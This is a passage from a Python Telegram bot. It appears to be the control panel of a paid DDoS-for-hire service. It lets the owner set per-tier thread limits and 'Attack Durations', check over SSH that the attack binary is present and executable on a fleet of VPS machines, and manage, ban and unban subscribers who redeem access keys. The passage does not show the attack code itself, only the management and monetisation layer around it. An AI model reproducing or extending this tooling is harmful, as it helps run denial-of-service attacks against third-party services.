        binary_executable = "Executable" in stdout.read().decode()
        health_data['binary_executable'] = binary_executable
        
        # 6. Check network connectivity
        stdin, stdout, stderr = ssh.exec_command("ping -c 1 google.com >/dev/null 2>&1 && echo 'Online' || echo 'Offline'")
        network_ok = "Online" in stdout.read().decode()
        health_data['network'] = network_ok
        
        ssh.close()
        
        # Calculate health percentage
        health_score = 0
        max_score = 6  # Total possible points
        
        if cpu_usage < 80: health_score += 1
        if mem_usage < 80: health_score += 1
        if int(disk_usage.strip('%')) < 80: health_score += 1
        if binary_exists: health_score += 1
        if binary_executable: health_score += 1
        if network_ok: health_score += 1
        
        health_data['health_percent'] = int((health_score / max_score) * 100)
        
        return health_data
        
    except Exception as e:
        print(f"Error checking VPS health for {ip}: {e}")
        return {
            'cpu': "Error",
            'memory': "Error",
            'disk': "Error",
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }

# Update the handler to show raw metrics
@bot.message_handler(func=lambda msg: msg.text == "üè• ùôëùôãùôé ùôÉùôÄùòºùôáùôèùôÉ")
def check_vps_health(message):
    if not is_owner(message.from_user):
        return
    
    status_messages = []
    for vps in VPS_LIST:
        stats = check_vps_load(vps[0], vps[1], vps[2])
        if stats:
            status = "‚úÖ Good" if stats['load'] < 1.5 and stats['memory'] < 70 else "‚ö†Ô∏è Warning" if stats['load'] < 3 else "‚ùå Critical"
            status_messages.append(
                f"üîπ {vps[0]}\n"
                f"‚îú Load: {stats['load']}\n"
                f"‚îú Memory: {stats['memory']}%\n"
                f"‚îî Status: {status}\n"
            )
    
    bot.reply_to(message, "üñ•Ô∏è VPS Health Status:\n\n" + "\n".join(status_messages))
            
@bot.message_handler(func=lambda msg: msg.text == "‚öôÔ∏è ùôèùôÉùôçùôÄùòºùòø ùôéùôÄùôèùôèùôÑùôâùôÇùôé")
def thread_settings_menu(message):
    """Handle thread settings menu access"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî Only owner can access thread settings!")
        return
    bot.send_message(
        message.chat.id,
        "‚öôÔ∏è Thread Settings Management Panel",
        reply_markup=create_thread_settings_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "üßµ SET NORMAL THREADS")
def set_normal_threads(message):
    """Ask admin for new max thread count for normal users"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî Only the owner can set normal thread count!")
        return
    
    bot.reply_to(message, "üßµ Please enter the new MAX THREADS for normal users:")
    bot.register_next_step_handler(message, process_normal_threads)

def process_normal_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 5000:
            raise ValueError("Thread count out of range.")
        global MAX_THREADS
        MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"‚úÖ Normal MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "‚ùå Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "‚ö° SET SPECIAL THREADS")
def set_special_threads(message):
    """Ask admin for new max thread count for special keys"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî Only the owner can set special thread count!")
        return

    bot.reply_to(message, "‚ö° Enter new MAX THREADS for SPECIAL key users:")
    bot.register_next_step_handler(message, process_special_threads)

def process_special_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 5000:
            raise ValueError("Thread count out of range.")
        global SPECIAL_MAX_THREADS
        SPECIAL_MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"‚úÖ Special MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "‚ùå Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "üíé SET VIP THREADS")
def set_vip_threads(message):
    """Ask admin for new max thread count for VIP users"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî Only the owner can set VIP thread count!")
        return

    bot.reply_to(message, "üíé Enter new MAX THREADS for VIP users:")
    bot.register_next_step_handler(message, process_vip_threads)

def process_vip_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 10000:
            raise ValueError("Thread count out of safe range.")
        global VIP_MAX_THREADS
        VIP_MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"‚úÖ VIP MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "‚ùå Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "üìä VIEW THREAD SETTINGS")
def view_thread_settings(message):
    """Show current thread settings"""
    response = f"""
‚öôÔ∏è *Current Thread Settings*:

‚Ä¢ üßµ Normal Threads: `{MAX_THREADS}`
‚Ä¢ ‚ö° Special Threads: `{SPECIAL_MAX_THREADS}` 
‚Ä¢ üíé VIP Threads: `{VIP_MAX_THREADS}`

*Attack Durations:*
‚Ä¢ Normal: `{MAX_DURATION}s`
‚Ä¢ Special: `{SPECIAL_MAX_DURATION}s`
‚Ä¢ VIP: `{VIP_MAX_DURATION}s`
"""
    bot.reply_to(message, response, parse_mode="Markdown")            


# ======================
# üë• USER MANAGEMENT (STYLISH VERSION)
# ======================

@bot.message_handler(func=lambda msg: msg.text == "üòÖ ùóîùóüùóü ùôêùôéùôÄùôçùôé")
def show_all_users_handler(message):
    """Show list of all users who interacted with the bot"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî Only owner can view user list!")
        return
    
    if not all_users:
        bot.reply_to(message, "‚ö†Ô∏è No users found in database!")
        return
    
    # Sort users by last active time (newest first)
    sorted_users = sorted(all_users.items(), key=lambda x: x[1]['last_active'], reverse=True)
    
    user_list = []
    for user_id, user_data in sorted_users:
        username = f"@{user_data['username']}" if user_data['username'] else user_data['first_name']
        status = "‚úÖ Active" if user_id in redeemed_users else "üö´ Not Active"
        last_seen = datetime.datetime.fromtimestamp(user_data['last_active']).strftime('%Y-%m-%d %H:%M')
        
        user_list.append(
            f"‚Ä¢ {username} - {status}\n"
            f"  ‚îú ID: `{user_id}`\n"
            f"  ‚îî Last Seen: {last_seen}\n"
        )
    
    # Split into chunks of 10 users to avoid message limits
    chunk_size = 10
    user_chunks = [user_list[i:i + chunk_size] for i in range(0, len(user_list), chunk_size)]
    
    for i, chunk in enumerate(user_chunks):
        header = f"üìä ALL USERS (Page {i+1}/{len(user_chunks)})\n\n"
        bot.send_message(
            message.chat.id,
            header + "\n".join(chunk),
            parse_mode="Markdown"
        )
        time.sleep(0.5)

@bot.message_handler(func=lambda msg: msg.text == "üî® ùòΩùòºùôâ ùôêùôéùôÄùôç")
def ban_user_start(message):
    """Start user ban process"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî Only owner can ban users!")
        return
    
    bot.reply_to(message, "‚ö†Ô∏è Enter username (with @) or user ID to ban:")
    bot.register_next_step_handler(message, process_ban_user)

def process_ban_user(message):
    """Process user ban"""
    identifier = message.text.strip()
    
    # Find user by ID or username
    banned_user = None
    for user_id, user_data in all_users.items():
        if (identifier == user_id or 
            (user_data['username'] and identifier == f"@{user_data['username']}")):
            banned_user = user_id
            break
    
    if not banned_user:
        bot.reply_to(message, "‚ùå User not found!")
        return
    
    # Add to banned users list (create if doesn't exist)
    if 'banned_users' not in globals():
        global banned_users
        banned_users = {}
    
    banned_users[banned_user] = {
        'banned_by': str(message.from_user.id),
        'timestamp': time.time(),
        'reason': "Manual ban by owner"
    }
    
    # Remove from redeemed users if exists
    if banned_user in redeemed_users:
        del redeemed_users[banned_user]
    
    save_data()
    
    bot.reply_to(message, 
        f"‚úÖ User banned successfully!\n"
        f"ID: `{banned_user}`\n"
        f"Username: @{all_users[banned_user].get('username', 'N/A')}")

# Add this to your is_authorized_user function to check bans
def is_authorized_user(user):
    user_id = str(user.id)
    if 'banned_users' in globals() and user_id in banned_users:
        return False
    return str(user.id) in redeemed_users or is_admin(user)

# Add this to your save_data function
# ======================
# üîì USER UNBAN FUNCTIONALITY
# ======================

@bot.message_handler(func=lambda msg: msg.text == "üîì ùôêùôâùòΩùòºùôâ ùôêùôéùôÄùôç")
def unban_user_start(message):
    """Start user unban process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùòÇùóªùóØùóÆùóª ùòÇùòÄùó≤ùóøùòÄ!")
        return
    
    # Check if there are any banned users
    if 'banned_users' not in globals() or not banned_users:
        bot.reply_to(message, "‚ÑπÔ∏è ùó°ùóº ùóØùóÆùóªùóªùó≤ùó± ùòÇùòÄùó≤ùóøùòÄ ùó≥ùóºùòÇùóªùó± ùó∂ùóª ùòÅùóµùó≤ ùòÄùòÜùòÄùòÅùó≤ùó∫.")
        return
    
    # Create a list of banned users with their details
    banned_list = []
    for user_id, ban_info in banned_users.items():
        user_data = all_users.get(user_id, {})
        username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
        banned_by = ban_info.get('banned_by', 'System')
        banned_time = datetime.datetime.fromtimestamp(ban_info.get('timestamp', time.time())).strftime('%Y-%m-%d %H:%M')
        
        banned_list.append(
            f"üî® ùó®ùòÄùó≤ùóø: {username}\n"
            f"‚îú ùóúùóó: `{user_id}`\n"
            f"‚îú ùóïùóÆùóªùóªùó≤ùó± ùóØùòÜ: {banned_by}\n"
            f"‚îî ùóïùóÆùóªùóªùó≤ùó± ùóºùóª: {banned_time}\n"
        )
    
    # Send the list with instructions
    safe_reply_to(
        message,
        f"üìã ùóïùóÆùóªùóªùó≤ùó± ùó®ùòÄùó≤ùóøùòÄ ùóüùó∂ùòÄùòÅ:\n\n" + "\n".join(banned_list) + 
        "\n\n‚ö†Ô∏è ùóòùóªùòÅùó≤ùóø ùòÅùóµùó≤ ùó®ùòÄùó≤ùóø ùóúùóó ùòÜùóºùòÇ ùòÑùóÆùóªùòÅ ùòÅùóº ùòÇùóªùóØùóÆùóª:",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, process_unban_user)

def process_unban_user(message):
    """Process user unban with premium styling"""
    user_id = message.text.strip()
    
    # Check if the user is actually banned
    if 'banned_users' not in globals() or user_id not in banned_users:
        bot.reply_to(message, f"‚ùå ùó®ùòÄùó≤ùóø ùóúùóó `{user_id}` ùó∂ùòÄ ùóªùóºùòÅ ùóØùóÆùóªùóªùó≤ùó± ùó∂ùóª ùòÅùóµùó≤ ùòÄùòÜùòÄùòÅùó≤ùó∫.", 
                     parse_mode="Markdown", reply_markup=create_main_keyboard(message))
        return
    
    # Get user details for confirmation
    user_data = all_users.get(user_id, {})
    username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
    
    # Remove from banned list
    del banned_users[user_id]
    save_data()
    
    safe_reply_to(
        message,
        f"‚úÖ ùó®ùòÄùó≤ùóø ùòÇùóªùóØùóÆùóªùóªùó≤ùó± ùòÄùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ!\n\n"
        f"‚Ä¢ ùó®ùòÄùó≤ùóøùóªùóÆùó∫ùó≤: {username}\n"
        f"‚Ä¢ ùó®ùòÄùó≤ùóø ùóúùóó: `{user_id}`\n\n"
        f"ùóßùóµùó≤ùòÜ ùó∞ùóÆùóª ùóªùóºùòÑ ùóÆùó∞ùó∞ùó≤ùòÄùòÄ ùòÅùóµùó≤ ùóØùóºùòÅ ùóÆùó¥ùóÆùó∂ùóª.",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard(message)
    )
    
    # Try to notify the unbanned user if possible
    try:
        bot.send_message(
            user_id,
            "üéâ ùó¨ùó¢ùó®ùó• ùóîùóñùóñùóòùó¶ùó¶ ùóõùóîùó¶ ùóïùóòùóòùó° ùó•ùóòùó¶ùóßùó¢ùó•ùóòùóó!\n\n"
            "The owner has unbanned your account. You can now use the bot again."
        )
    except Exception as e:
        print(f"Could not notify unbanned user {user_id}: {e}")


# ======================
# üöÄ BOT INITIALIZATION
# ======================
if __name__ == '__main__':
    load_data()
    load_admins()
    print("ùóïùóºùòÅ ùóµùóÆùòÄ ùóØùó≤ùó≤ùóª ùóπùóÆùòÇùóªùó∞ùóµùó≤ùó± ùòÄùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ! ¬ª¬ª‚Äî‚Äî ùêÄùêãùêéùêçùêÑ ∆Å∆†∆≥ ‚ô•")
    
    # Run cleanup every hour
    def periodic_cleanup():
        while True:
            cleanup_expired_users()
            time.sleep(3600)  # 1 hour
            
    cleanup_thread = threading.Thread(target=periodic_cleanup)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    bot.polling(none_stop=True)